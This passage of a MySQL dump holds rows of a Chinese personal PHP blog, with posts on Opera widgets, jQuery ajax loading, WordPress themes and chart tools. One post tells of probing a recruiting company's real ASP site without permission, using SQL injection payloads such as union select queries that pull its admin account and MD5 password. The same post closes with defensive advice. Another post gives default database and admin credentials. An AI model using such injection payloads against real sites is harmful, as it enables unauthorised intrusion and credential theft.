</p>\r\n<P>或许大家看到这里会疑问，“哇靠，paperen你是不是在骗人啊，说叉p系统不能玩widegt又放出这么多widget图片”，确实xp系统是不识别widget文件的啊，但是paperen我使用了opera嘛（opera也是一个很出名的浏览器），在opera浏览器的平台上你可以安装并运行widget，目前只能这样了，paperen我还没找到使xp直接启动widget的办法，找的资料全是E文的，但还是没找到，感觉好像中国对widget这方面的资料还是很少的。 </p>\r\n<P>paperen我也来揭示一下一个很简单的widget程序的文件目录。</p>\r\n<P><a href="http://localhost/paperenblog/file/16" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/16" alt="201001081262958484" title="上传于2010-01-08"></a></p>\r\n<P>基本上与写网页文件差不多的，config.xml是声明这个是一个widget程序并声明一些参数，widget的长宽，作者描述等等，ico，jpg等一般可以用来当做widget程序的图标，index文件就是主文件啦，还有css文件是对widget进行美化的，当然少不了JavaScript脚本文件（这里的截图没放出来，因为都写到index中去了），其实真的与写一个网页差不多，但是功夫主要在Java上，老实说paperen玩JavaScript玩得也不是很强啊，但是写一些简单的js还勉强可以。你也可以照着下面这个教程弄一个自己的widget。 </p>\r\n<P><A href="http://kb.operachina.com/node/80">http://kb.operachina.com/node/80</A></p>\r\n<P><A href="http://bbs.operachina.com/viewtopic.php?f=38&amp;t=43373">http://bbs.operachina.com/viewtopic.php?f=38&amp;t=43373</A> </p>\r\n<P>还有强烈推荐你安装上opera去体验一下widget的魅力，还有现在一些Nokia手机也支持widget了。当你接触过widget后，你会不会觉得下一代的桌面将由widget来取代呢，paperen我觉得挺有可能的。下面的网址是分享给想对widget有进一步了解的小朋友看的。还是出自opera中文网站，很不错的教程。 </p>\r\n<P><A href="http://kb.operachina.com/taxonomy/term/29">http://kb.operachina.com/taxonomy/term/29</A></p></p>', 2, 1, 1121, 0, 0, 0, 1262959505, 0),
(24, 'ajax load实例', 'ajax-load', 3, '<P>前些日子看到某个网站的前端效果比较不错所以去挖了他的js下来看，发现用了ajax的load事件去实现一些很不错的功能，例如下面iplaysoft网站中这部分的功能。 </p>\r\n<P><a href="http://localhost/paperenblog/file/17" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/17" alt="201001111263171749" title="上传于2010-01-11"></a> </p>\r\n<P>你也可以先看看我做的一个小DEMO <A href="http://iamlze.cn/demo/ajax-load/">http://iamlze.cn/demo/ajax-load/</A></p><!--more-->\r\n<P>点击每个tab可以转换看到不同的信息内容。下面来看看是怎样实现的吧，其实简单来说需要两个文件就可以了，一个是显示给大家看的它可以是html的也可以是php等动态网页格式（作为框架就是下面的index.html），另一个就必须是一个CGI格式的文件，因为它是用来获得触发并使信息改变的 </p>\r\n<P>首先要引入jquery框架</p><P><PRE>&lt;script language="javascript" type="text/javascript" src="js/jquery.min.js"&gt;&lt;/script&gt;</PRE><P></p><P>然后在那个index页中放上一个div作为容器，对于容器的选取大家可以根据自己需要就行，也不是非要用div来做，并给它一个id号作为钩子。然后直接写脚本。</p><P><PRE>&lt;div id="ajaxload"&gt;<br /> &lt;script language="javascript" type="text/javascript"&gt;<br /> $("#ajaxload").load("test.php");//默认让这个div载入test.php的内容<br /> &lt;/script&gt;<br /> &lt;/div&gt;<br /></PRE><P></p><P>先来看看可不可以载入test页的东西吧，我们随便在test那个页中写个hello之类的东西。</p>\r\n<P><a href="http://localhost/paperenblog/file/18" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/18" alt="201001111263183747" title="上传于2010-01-11"></a> </p>\r\n<P>果然这个方法是可以滴，那么我们再来进一步扩展，去实现我们的功能。我们就参照上面那个模板弄吧，当然大家可以发挥自己的想象力去实现别的效果。ajaxload这个div里面的布局大概如下，当然因为这整个div的内容都是来自test页面的，所以在test页中放上下面这个框架就行。 </p>\r\n<P><a href="http://localhost/paperenblog/file/19" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/19" alt="201001111263185746" title="上传于2010-01-11"></a> <br /></p><P><PRE>&lt;div id="hello"&gt;<br />&lt;a href="#"&gt;message&lt;/a&gt;<br />&lt;/div&gt;<br />&lt;ul class="nav"&gt;<br />&lt;li&gt;&lt;a href="#"&gt;1&lt;/a&gt;&lt;/li&gt;<br />&lt;/ul&gt;<br />&lt;div class="c"&gt;&lt;/div&gt;<br /></PRE><P></p><P>然后再写php代码去实现hello那个div中抽取数据库的信息，nav那为页数显示（php代码这里就不放出来了，比较的多，主要要实现读取数据库信息，还有根据页数分页显示数据）。对于分页的功能这里自己也写一下吧，paperen我目前为止还是这样写的。 </p><PRE>$each=5;//定义每页显示数据数<br />$page=isset($_POST[''page'']) ? intval($_POST[''page'']) : 1;//检查是否存在page变量并过滤<br />$db=new sql();//创建一个对象（这里sql类就不贴出来了，因为比较长而且涉及到一些敏感信息）<br />$total=$db-&gt;getcount("select count(*) from `table`");//获取数据总数<br />$pagenum=($total%$each==0) ? $total/$each : (int)($total/$each)+1;//并确定页数<br />$page=($page&gt;$pagenum || $page&lt;=0) ? 1 : $page; //对page变量做进一步正确过滤<br />$offset=($page-1)*$each;//获得查询的数据位置<br />$sql="SELECT id,title FROM `table` ORDER BY id Desc LIMIT $offset,$each";//sql语句</PRE><P>然后用一个for循环用来显示页数就行,因为已经知道总页数$pagenum了。</p><P><PRE>&lt;ul class="nav"&gt;<br />&lt;?php <br />for($i=1;$i&lt;=$pagenum;$i++){<br />?&gt;<br />&lt;li&gt;&lt;a href="javascript:void(0);"&gt;&lt;/a&gt;&lt;/li&gt;<br />&lt;?php<br />}<br />?&gt;<br />&lt;/ul&gt;<br />&lt;div class="c"&gt;&lt;/div&gt;<br /></PRE><P></p>\r\n<P>再写写css来美化一下页面。效果如下。 </p>\r\n<P><a href="http://localhost/paperenblog/file/20" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/20" alt="201001111263188560" title="上传于2010-01-11"></a> </p>\r\n<P>还差最后一步了，交互功能的实现，就是我们点击橙色的小点时，上面的信息会随着变化，也是比较重点之处，不知道各位小朋友看到这里有没有什么思路，paperen我是觉得先看看能不能在本index页面获得test页面的元素并接收它的动作吧，我为&lt;li&gt;&lt;a href="javascript:void(0);"&gt;&lt;/a&gt;&lt;/li&gt;加上一个点击事件<P>再测试看看行不行。</p>\r\n<P><a href="http://localhost/paperenblog/file/21" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/21" alt="201001111263189088" title="上传于2010-01-11"></a> </p>\r\n<P>果然可以，嘻嘻这下就好办了。再在这个超链接的click事件用一个函数来处理，在index页面加上一些脚本。</p><P><PRE>&lt;li&gt;&lt;a href="javascript:void(0);" onClick="nextpage(&lt;?=$i?&gt;)"&gt;&lt;/a&gt;&lt;/li&gt;<br />&lt;script language="javascript" type="text/javascript"&gt;<br />$("#ajaxload").load("test.php");<br />function nextpage(page){<br /> $("#ajaxload").load("test.php",{''page'':page});<br />}<br />&lt;/script&gt;<br /></PRE><P></p><P>注意一下load事件是用post的方法传送数据的，也就是为什么要在test页中用$_POST去接收page这个变量。 </p>\r\n<P>真的是很不错的前台效果，大家可以回去自己试试。</p></p>', 2, 1, 1845, 2, 0, 0, 1263195960, 0);
INSERT INTO `post` (`id`, `title`, `urltitle`, `categoryid`, `content`, `authorid`, `ispublic`, `click`, `good`, `bad`, `savetime`, `posttime`, `isdraft`) VALUES
(25, '小心sql注入漏洞', 'sql-inject', 4, '<P>今天早上学院开了个会，说了些关于毕业实习与设计的安排之类的还有说明天有个企业来招聘，让有兴趣的人回去登录他们公司的网站看看。paperen我当然是没有这个兴趣的啦，但是宿舍的小华同学就有点兴趣，回来就上了他们的网站。但是…… </p>\r\n<P>paperen我也瞅了几眼，网站不咋的啊，asp的，也不知道为啥突然想也去踩踩，看看有没有存在sql注入漏洞，登上他们的网站，看了几个页面，去到公司新闻那，有一条新闻url是xwzx_content.asp?id=456（很正常的传值，根据id值去查数据库并显示相应的数据，也很合理），但是…… </p>\r\n<P>paperen我将参数改为xwzx_content.asp?id=456 and 1=1试了试，发现与id=456显示是一样的。（并不能证明是否存在漏洞） </p><!--more-->\r\n<P>然后又试试这个xwzx_content.asp?id=456 and ''1''=''1结果是</p>\r\n<P><a href="http://localhost/paperenblog/file/22" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/22" alt="201001111263199370" title="上传于2010-01-11"></a> </p>\r\n<P>提示错误由此可以判断出存在漏洞，因为你可以在自己的数据库随便找个表来试试这个语句 </p>\r\n<P>select * from table where id=1 and 1=1(某一条记录的id号)，其实加上and 1=1与不加是一样的结果，因为1=1是true的，sql肯定可以执行过去，但如果你是1=2的话就不行了，因为很显然1不等于2，为false所以查不到任何数据。 </p>\r\n<P>然后继续去构造语句xwzx_content.asp?id=456 or 1=1，结果是<a href="http://localhost/paperenblog/file/23" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/23" alt="201001111263199801" title="上传于2010-01-11"></a> </p>\r\n<P>得出这个结果也是很显然的，因为or上一个1=1（ture）结果也是true的，无论你的id号为456这条数据是否存在都会查出所有数据记录。 </p>\r\n<P>从上面几个操作就证实了sql注入漏洞确实在这个页面存在，下面开始正式的注入爆出我们想得到的信息，主要是看你的RP。 </p>\r\n<P>我们需要使用union联合查询出其管理密码与账号。当然前提是你要去猜出管理员那个表的名字。 </p>\r\n<P>paperen我第一个想到的就是admin，试试吧。</p><PRE>xwzx_content.asp?id=456 union select * from admin</PRE><P>结果是</p><P><a href="http://localhost/paperenblog/file/24" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/24" alt="201001111263200513" title="上传于2010-01-11"></a> </p>\r\n<P>提示字段数不匹配，那么我们再去猜它的字段数吧</p><PRE>xwzx_content.asp?id=456 union select 1,2,3,4,5,6 from admin</PRE><P>结果是</p><P><a href="http://localhost/paperenblog/file/25" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/25" alt="201001111263201404" title="上传于2010-01-11"></a> </p>\r\n<P>看来是猜对了，这个表中共有10个字段，其中4这个字段会被显示到页面中。可能大家不太明白这里到底是什么回事，paperen我不妨放出一个自己在mysql中的一个截图。</p><PRE>sql命令是SELECT * FROM `paper_blog` WHERE id =1 UNION SELECT 1 , 2, 3, 4, 5, 6, 7, 8, 9, 10 FROM member</PRE><P><a href="http://localhost/paperenblog/file/26" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/26" alt="201001111263201159" title="上传于2010-01-11"></a> </p>\r\n<P>看到第二行的1，2，3，4，5了吧，反正自己领会领会吧，关于union这个联合查询不知道大家有没有用过，简单地说就是将别的表的数据都查询过来。 </p>\r\n<P>再来猜他放管理员账号那个字段名，我就猜是name吧。</p><PRE>xwzx_content.asp?id=456 union select 1,2,3,name,5,6 from admin</PRE><P>结果是</p><P><a href="http://localhost/paperenblog/file/27" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/27" alt="201001111263201510" title="上传于2010-01-11"></a> </p>\r\n<P>这就证明猜错了，继续猜叫admin，嘻嘻，果然有了。</p>\r\n<P><a href="http://localhost/paperenblog/file/28" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/28" alt="201001111263201608" title="上传于2010-01-11"></a> </p>\r\n<P>爆出管理员的账号是admin，再来爆他的密码，就猜叫password吧。</p><PRE>xwzx_content.asp?id=456 union select 1,2,3,password,5,6 from admin</PRE><P>结果是</p>\r\n<P><a href="http://localhost/paperenblog/file/29" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/29" alt="201001111263203950" title="上传于2010-01-11"></a> </p>\r\n<P>密码是32位的，应该是MD5加密的，ctrl+c一下到一些在线解MD5的网站一查，密码竟然也是admin……这安全意识也太差了吧。 </p>\r\n<P>账号有了密码也有了，还差什么？很明显是后台地址，但是paperen我还是找不到啊，蒙不对地址，看到这里不知道大家是不是有些少失望，唉，paperen我也有点，但是算了，我还要发表博文呢，先不花时间去碰了。反正这个网站给我的印象就是不太好，公司估计也不咋的吧。 </p>\r\n<P>其实要入侵一个网站真的不是很容易的，要防入侵也是很不容易的，但是从上面说的这些可以看出某些观点去防止出现这种很低级的错误。 </p>\r\n<P>1.对get传参的参数进行过滤与判断</p>\r\n<P>2.不要参照某些开源的程序的数据库表或表名去建立自己的数据库</p>\r\n<P>3.要使用比较复杂的密码，至少不要admin，admin888之类的</p>\r\n<P>4.放后台文件的文件夹名字最好改得特别点，不要让人轻易猜到</p>\r\n<P>5.对于asp网站的数据库文件最好改后缀为asp的，防止被下载 </p>\r\n<P>paperen想到的就这么多了，sql注入也是一门学问吧（对于所谓的hacker而言），而大家在写代码的时候一定要切记第一条啊，过滤与判断正确的参数，这个是很很很重要滴！吹水完毕……</p></p>', 2, 1, 986, 0, 0, 0, 1263204719, 0),
(26, 'google要离开中国', 'google-leave', 4, '<P>听说谷歌要离开中国，确实是一个不少的新闻，但是好像目前还没有算是正式退出中国市场，在网上看了些资料，原因不少，但是总的原因好像是在中国站不住脚的说，争不过百度，投入不少但是利润却不多，paperen我虽然对网络营销也不是很懂，但是谷歌难道真的就这样退出啊？google来到中国才几年，就想一下子占用中国网络较重的地位显然不太实际，而其还有百度这个强劲对手，paperen个人认为，google还是应该留着，毕竟中国还是有市场的。 </p>\r\n<P>对于百度与谷歌两大搜索引擎的使用嘛，paperen我挺喜欢google的，百度确实是国产的，你说应该支持国产的，貌似是应该支持，但是paperen我还是喜欢用google多点，你总不能因为这个来鄙视我吧……现在的思想这么开放，是吧？google的api功能挺不错的啊，他某些方面确实比百度做得要好，不知道各位有没有用过google的其他功能，而且google来踩paperen网站的次数也是不少的，而百度就……目前还没收录的说……可能是paperen我的SEO（搜索引擎优化）没做好吧，从这一点上我是顶google的，大家不要怪我自私嘛，是吧？ </p>\r\n<P>总之嘛，我觉得google应该不会走吧，不知道你怎么想的，还有大家平时用不用google搜索东西的啊？paperen觉得应该也不多，宿舍八个人就我一个用google搜索的，哎，确实看到google在中国的地位了…… </p><!--more-->\r\n<P>貌似又写了一篇无聊的文章…… </p>\r\n<P><A href="http://opinion.huanqiu.com/roll/2010-01/690659.html">http://opinion.huanqiu.com/roll/2010-01/690659.html</A></p></p>', 2, 1, 1117, 0, 0, 0, 1263651119, 0),
(27, '两个好用而且免费的php报表工具', 'two-open-chart-tools', 2, '<P>话说吴同学有任务给我做，昨天还打电话给我说需要搞几个功能，一个是报表一个是打印，昨天都研究了打印那个控件半天，结果证实了某些功能需要购买才能使，也不能怪人家，都不容易嘛，哪有像外国人那么大方的（貌似是吧……）就找了这两个报表工具而言（都是free的--免费），当然你也可以买，paperen我也不知道付费与不付费有啥不同，没仔细看他们的网站。（还有事先声明paperen我没给他们买广告……） </p>\r\n<P><A href="http://down.52z.com/xl/FusionChartsFree.rar">http://down.52z.com/xl/FusionChartsFree.rar</A> FusionChartsFree下载 </p>\r\n<P>至于open-flash-chart的下载自己到官网上找找就有，paperen我忘了记地址了…… </p><!--more-->\r\n<P>自己照着FusionCharts给的例子也搞了下，给自己博客的文章类别统计一下， </p>\r\n<P><A href="http://iamlze.cn/demo/charts/">http://iamlze.cn/demo/charts/</A></p>\r\n<P>（1.18 16:12补上自己用open-flash-chart做的demo） </p>\r\n<P><A href="http://iamlze.cn/demo/charts/ofc.php">http://iamlze.cn/demo/charts/ofc.php</A></p>\r\n<P>大家可以对比一下效果，调用方法都很全，自己看看就懂了，其实paperen我花在FusionCharts的时间比open-flash-chart要多点，毕竟FusionCharts下载下来里面就有一个很好的学习教程，一般你跟着做就可以了，支持导入xml文件的，也支持以字符串的形式导入数据，好像不支持json，但是我看了一下open-flash-chart就支持json，可能是我这个版本的FusionCharts的缘故吧，反正自己看了他的Tutorial还没看到有json的字眼，一般都是xml的。 </p>\r\n<P>事实上两个功能好像都差不多，但paperen个人还是喜欢open-flash-chart的视觉效果，没FusionCharts那么土吧，截几张图片看看就知道啦，或者到这里看看也行（从上面的demo也可以看出那个漂亮点了吧）。 </p>\r\n<P><A href="http://teethgrinder.co.uk/open-flash-chart/">http://teethgrinder.co.uk/open-flash-chart/</A> </p>\r\n<P><a href="http://localhost/paperenblog/file/30" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/30" alt="201001181263790321" title="上传于2010-01-18"></a> </p>\r\n<P>而且open-flash-chart的花样也不少，不过大家用的时候要注意一下编码的问题，如果是数据是中文的话可能需要用iconv一下,还有推荐大家用火狐看这种报表，为什么？自己试试就明白了。</p></p>', 2, 1, 3154, 1, 0, 0, 1263790547, 0),
(29, '那些令人感动的生命', 'some-moving', 1, '<P>在你觉得生活没劲时或许应该看看这些了，那些顽强而且令人感动的生命，paperen我看完后都留了一摊泪水，绝对不是夸张 </p>\r\n<P><A href="http://v.youku.com/v_show/id_XMzY5Mjk5OTY=.html">http://v.youku.com/v_show/id_XMzY5Mjk5OTY=.html</A></p></p><!--more-->', 2, 1, 1222, 0, 0, 0, 1264052435, 0),
(28, '返回顶部的js', 'backtop-js', 3, '<P>为博客换了些装备与添加上一些功能，灵感来自于昨天paperen我看的那些博客，都是基于WordPress开发的了，当然paperen我也不会错过扒人家的东西来看看这个好机会（其实同大家偷瓜偷菜不一个样），配合opera浏览器的开发者工具去挖就真是很方便了（大家如果用过就明白了） </p>\r\n<P><a href="http://localhost/paperenblog/file/31" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/31" alt="201001201263978222" title="上传于2010-01-20"></a> </p>\r\n<P>话说paperen看中了那个滑回顶部的小功能，找了它的js文件，弄过来就亲自测试起来了，现在paperen的博客都添加上这个功能了（至于赞与踩那个功能paperen我可没抄别人的东西啊） </p><!--more-->\r\n<P>代码我都贴出来吧，也不是很长。 </p><PRE>(function(){<br /> function goTop(acceleration,time){<br />  acceleration=acceleration||0.1;//判断变量是否已定义，如果没有定义就给他一个初始值<br />  time=time||16;<br />  var dx=0;<br />  var dy=0;<br />  var bx=0;<br />  var by=0;<br />  var wx=0;<br />  var wy=0;<br />  if(document.documentElement){<br />   dx=document.documentElement.scrollLeft||0;<br />   dy=document.documentElement.scrollTop||0;<br />  }<br />  if(document.body){<br />   bx=document.body.scrollLeft||0;<br />   by=document.body.scrollTop||0;<br />  }<br />  //一个是XHTML的<br />  //一个是HTML的<br />  //为了兼容都写上<br />  var wx=window.scrollX||0;<br />  var wy=window.scrollY||0;<br />  var x=Math.max(wx,Math.max(bx,dx));<br />  var y=Math.max(wy,Math.max(by,dy));<br />  var speed=1+acceleration;<br />  window.scrollTo(Math.floor(x/speed),Math.floor(y/speed));<br />  if(x&gt;0||y&gt;0){<br />   var invokeFunction="MGJS.goTop("+acceleration+", "+time+")";<br />   window.setTimeout(invokeFunction,time);<br />  }<br /> }<br /> window[''MGJS'']={};//window.MGJS=new Object();<br /> window[''MGJS''][''goTop'']=goTop;//window.MGJS.goTop=goTop;<br />})()</PRE><P>一开始paperen我也有些地方不太明白(上面自己都加了适当的注释了)确实自己的JavaScript水平不咋的，特别是对于后两行代码，还有最后那个()，到qq群问了一下，高手们的回答的确是一针见血的…… </p>\r\n<P>“为什么后面还有个()?”---因为买了东西要用，建了函数要运行，因为前面没口，所以开个口，就是马上就会执行这个函数，()是函数是马达，没马达不走，前面是一盆水 后面开口水就流。 </p><PRE>(function(){<br />     alert("ddd");    <br />})() //这样直接就执行了</PRE><P>现在来看看这个()还是没搞明白，就是说一开始就运行了goTop这个函数？显然不是啦，我用alert测试过了。不明白的还是得保留，以后或者就会有启发了。但是对于这段js的思想还是要看懂的。 </p>\r\n<P>话就话是个回到顶部的js，但是仔细看看代码其实功能是回到(0,0)，不单单是y轴，x轴也归零了，很全面的一个函数。然后自己参照一下它的思路也写了一个相当单纯滴，当然也要show一下，不然怎能显出我比较牛的水平呢，大家说是吧？ </p><PRE>function goTop_beta(){<br /> var speed=1.2;<br /> var time=16;<br /> var dy=0;<br /> var by=0;<br /> var wy=0;<br /> if(document.documentElement){ dy=document.documentElement.scrollTop||0; }<br /> wy=window.scrollY||0;<br /> var y=Math.max(wy,Math.max(by,dy));<br /> window.scrollTo(0,Math.floor(y/speed));<br /> if(y&gt;0){<br />  setTimeout("goTop_beta()",time);<br /> }<br />}</PRE><P>描述一下功能：点击回到顶部后，如果x轴有拖动条且拖动条距离左边有数值的话，速回0处（水平方向上），而y轴的效果与上面那个一样，还有我这个只适用于xhtml，那么在调用处加上onclick="goTop_beta()"就可以了。就不用创建那个MGJS对象。 </p>\r\n<P>大家可以自己拷贝代码测试一下，也是个挺不错的功能。 </p>\r\n<P>还有大家可以看看这个，关于js的||与&amp;&amp;运算不错的一课。</p>\r\n<P><A href="http://www.javaeye.com/topic/462449">http://www.javaeye.com/topic/462449</A></p></p>', 2, 1, 1450, 0, 1, 0, 1263980461, 0),
(30, '关于打造自己的WP主题', 'about-make-my-wp-theme', 2, '<P>相信在大多数blogger中甚至在大多数喜欢网上冲浪的人眼中，WordPress这个名词就从没有陌生过，虽然paperen我没做过统计但是在10个博客中至少有6个是用WordPress打造的，不是我夸张是实际如此。power by wordpress，即使你在他网页中看不到这段话但是在地址栏加上wp-login.php，也就会看到WordPress的登录入口。</p>\r\n<P><a href="http://localhost/paperenblog/file/32" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/32" alt="201001241264263309" title="上传于2010-01-24"></a></p>\r\n<P>其实paperen不是特别推荐php新手直接就从WordPress开始你的php之路，因为一开始接触wp（WordPress的简称），你需要从创作主题开始慢慢上手，而创作主题的过程中其实你接触到的php的核心代码是很少的，一般你只是在用wp已经封装好的函数，创作一些文件，paperen我今天才算弄了一个比较像样的主题，但是总觉得不是我渴望那种方式，怎我还是觉得自己从头到尾写完一个网站比较有feel点，不过对快速开发网站而言，WordPress的优势实在是很明显，本身的功能对于打造博客而言已经是很足够了，但是你还可以改造成一些cms网站，企业网站。其实说到底paperen似乎是说自己没有将wp玩熟了。 </p><!--more-->\r\n<P>但是还是给大家分享一下paperen自己制作主题过程中一些问题吧还有自己查的一些好用的资料吧。 </p>\r\n<P>第1步，你要去将wp的后台了解得差不多，随便挑个主题然后发布一些东西试试（半个小时足矣）</p>\r\n<P><a href="http://localhost/paperenblog/file/33" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/33" alt="201001241264265146" title="上传于2010-01-24"></a> </p>\r\n<P>第2步，随便打开一个主题，看看它的代码（index.php,header.php,sidebar.php,comments.php,single.php,category.php)）对里面的函数有个了解。</p>\r\n<P>相应的帮助资料有：</p>\r\n<P><A href="http://codex.wordpress.org/Template_Tags/">http://codex.wordpress.org/Template_Tags/</A> 官方的</p>\r\n<P><A href="http://www.wordpress.la/codex-模板标签.html">http://www.wordpress.la/codex-模板标签.html</A> 非官方但是是中文的</p>\r\n<P><A href="http://codex.wordpress.org/The_Loop_in_Action">http://codex.wordpress.org/The_Loop_in_Action</A> 特别是loop </p>\r\n<P>第3步，开始动手写写，目的是熟悉一下函数，创建一个自己的主题，在wp-contentthemes目录下新建一个文件夹，在里面先放上style.css与index.php文件，然后在index.php文件中练练一些基本的函数。（记住要自己写写，不然没多大作用。）</p>\r\n<P>相应的帮助资料有：</p>\r\n<P><A href="http://www.wpdesigner.com/2007/02/21/wp-theme-lesson-1-intro/">http://www.wpdesigner.com/2007/02/21/wp-theme-lesson-1-intro/</A> 相当适合初学者</p>\r\n<P><A href="http://paranimage.com/wordpress/tutorials/">http://paranimage.com/wordpress/tutorials/</A> 也是一个很全面的教程不过说得比较少,都是许多链接</p>\r\n<P><A href="http://www.smashingmagazine.com/2008/09/15/wordpress-developers-toolbox/">http://www.smashingmagazine.com/2008/09/15/wordpress-developers-toolbox/</A> 貌似是初学者的宝典了 </p>\r\n<P>第4步，开始设计你的主题，你要确定你的网站需要什么页面，什么几个类别，然后可以用ps，fireworks等作图软件进行设计，最后做成html页面（包括css的编写）。</p>\r\n<P><a href="http://localhost/paperenblog/file/34" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/34" alt="201001241264265295" title="上传于2010-01-24"></a> </p>\r\n<P>第5步，进行index.php,header.php,sidebar.php,comments.php,single.php,category.php等页面的编写。</p>\r\n<P>关于hacks <A href="http://www.webdesignerwall.com/tutorials/wordpress-theme-hacks/ hacks">http://www.webdesignerwall.com/tutorials/wordpress-theme-hacks/ hacks</A> </p>\r\n<P>第6步，最终测试并调试效果。 </p>\r\n<P>后面的几步并不是没有参考资料，当然你可以参考前几步那些资料，特别是wp官网中emplate_Tags那些函数，你肯定会用得到的，至少查查参数看看例子也是可以帮上忙的。 </p>\r\n<P>其实一般来说可以分为这么几步吧，至于时间的多少嘛，paperen我也不好说，看你自己的领会与动手了，快的可能一两天，慢的也得一个星期吧，paperen我自己就属于那种不快也不慢的。 </p>\r\n<P>而在自己创作主题过程的遇到的一些问题也放出来吧，或者大家也会碰上。 </p>\r\n<P>1.边栏分类别显示近几条资料</p>\r\n<P><a href="http://localhost/paperenblog/file/35" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/35" alt="201001241264263380" title="上传于2010-01-24"></a> </p><PRE> query_posts(''category_name=products&amp;showposts=5'');<br /> while(have_posts()) : the_post();<br />?&gt;<br />  <br /><br /></PRE><P>最后记得wp_reset_query();不然之后的while(have_posts())可能会遇到一些问题，自己实践一下就明白了。 </p>\r\n<P>2.不同类别判断，is_category(''news'')使用is_category()就可以了，其参数可以使id号也可以是名称，详细参数还是得看看参考资料吧 </p>\r\n<P>3.创建不同的页面，比如留言板，公司新闻，产品，关于等等页面时，你需要用上模板，在管理后台编辑页面选择模板页，但是前提是，你需要先创建模板页面，比如guestbook.php,然后在guestbook.php前面写上一段注释，然后在管理后台就可以用这个模板了。 </p><PRE>/*<br />Template Name:guestbook<br />*/<br />?&gt;</PRE><P><a href="http://localhost/paperenblog/file/36" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/36" alt="201001241264263740" title="上传于2010-01-24"></a></p><P><a href="http://localhost/paperenblog/file/37" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/37" alt="201001241264263749" title="上传于2010-01-24"></a> </p>\r\n<P>4. Custom Fields 自定义域的使用，在文章旁边添加一幅图片或其他东西（paperen我暂时是试了放图片）,例如在添加文章时，手动添加上一个叫pic_thumb的自定义域，值为一张图片的路径，之后在代码loop里面写上 </p><PRE> $thumb=get_post_meta($post-&gt;ID,''pic_thumb'',$single=true);//$thumb变量就是我们那张图片的路径了<br /> $alt=get_post_meta($post-&gt;ID,''pic_alt'',$single=true);<br />?&gt;<br /><a href="http://localhost/paperenblog/file/38" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/38" alt="201001241264264146" title="上传于2010-01-24"></a> </p>\r\n<P>至于样式的事情交给css去做好了。 </p>\r\n<P>5.Template_Hierarchy--文件层次，wp的文件调用先后次序，也是很值得大家了解的资料 </p><P><A href="http://codex.wordpress.org/Template_Hierarchy">http://codex.wordpress.org/Template_Hierarchy</A> </p>\r\n<P>暂没有了吧，先写这么多吧，paperen以后再补充吧，毕竟打造wp主题总不是这么两三笔就能说完的，你看看别人写的教程就知道什么回事了。当然啦，经验与心得也是很重要的。希望对大家有帮助吧，最后最后还得说，大家一定要动手才有效果，不然看资料都足够让你睡着了……</p></p>', 2, 1, 1690, 0, 0, 0, 1264264916, 0),
(51, 'paperenblog源代码下载', 'paperenblog-source', 2, '<p>之前都有想过将paperen的博客开源，不过最近到了深圳空余时间就越来越少了，而今天终于提早来公司将paperen的博客发布了。</p><p>本博客是PHP的，默认数据库为mysql。因为最近paperen的在线时间实在太少了，住的地方还没办上网，所以目前没有安装程序，也就说需要手动配置一下，请大家按照以下步骤进行手动配置。</p><p>将paperenblog.rar解压后：<br /><br />1.登录到您的数据库并新建一个数据库，如果之前有数据库的话可以跳过这步（比如您现在新建了一个叫paperenblog的数据库）</p><!--more--><p><a href="http://localhost/paperenblog/file/39" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/39" alt="20100723084901" title="上传于2010-07-23"></a></p><p><br />2.打开sql.txt，将sql语句导入到您的数据库中（即导入到paperenblog数据库中）</p><p><a href="http://localhost/paperenblog/file/40" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/40" alt="20100723084912" title="上传于2010-07-23"></a></p><p><br />3.进入blog_config表主要修改一下url参数的数据，默认是http://localhost/paperenblog，请根据自己的需要修改（例如我现在是在本机测试的，而放到一个叫blog的文件夹中，故这改为http://localhost/blog，如果我是要放到自己的空间上那么就为http://您的域名）最后不需要加上/</p><p><a href="http://localhost/paperenblog/file/41" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/41" alt="20100723084939" title="上传于2010-07-23"></a><br /><br />4.修改db_config.php文件中的相应参数<br />define(''DBWHERE'', ''localhost'');//您数据库的地址<br />define(''DBUSER'', ''root'');//数据库登录账号<br />define(''DBPWD'', ''root'');//数据库登录密码<br />define(''DBNAME'', ''paperenblog'');//数据库名称（如果您的数据库不是paperenblog的话就改为您刚才新建的那个数据库名称）</p><p><a href="http://localhost/paperenblog/file/42" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/42" alt="20100723084850" title="上传于2010-07-23"></a></p><p><br />5.上传文件到您的空间上（如果是在本地测试请放到本机的web站点目录下）<br /><br />4.访问后台，地址是http://您的域名/admin.php，使用默认的账号paperen，密码1234登录后台（对于账号与密码的修改要在自己的数据库中改blog_admin表，其中name字段就是账号，默认为paperen，而password就是密码需要先用md5加密，可以使用一下http://www.cmd5.com/在线加密）</p><p><a href="http://localhost/paperenblog/file/43" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/43" alt="20100723085329" title="上传于2010-07-23"></a><br /><br />6.到settings页面根据自己的需要修改相应的参数<br /></p><p><a href="http://localhost/paperenblog/file/44" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/44" alt="20100723084923" title="上传于2010-07-23"></a></p><p><a href="http://localhost/paperenblog/file/45" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/45" alt="20100723084931" title="上传于2010-07-23"></a></p><p>如果您对这个程序有什么意见或在配置时有什么疑问，请给paperen邮件 